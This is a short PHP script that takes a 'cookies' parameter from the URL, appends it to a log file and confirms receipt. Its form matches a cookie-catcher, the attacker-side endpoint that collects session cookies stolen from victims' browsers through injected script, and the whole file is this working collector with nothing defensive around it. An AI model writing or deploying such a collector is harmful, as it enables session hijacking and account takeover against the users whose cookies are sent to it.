<?php
// Get the cookies from the request
$cookies = isset($_GET['cookies']) ? $_GET['cookies'] : 'No cookies received';

// Log the cookies to a file
file_put_contents('cookies.txt', $cookies . "\n", FILE_APPEND);

// Optional: Display a message
echo "Cookies received and logged.";
?>
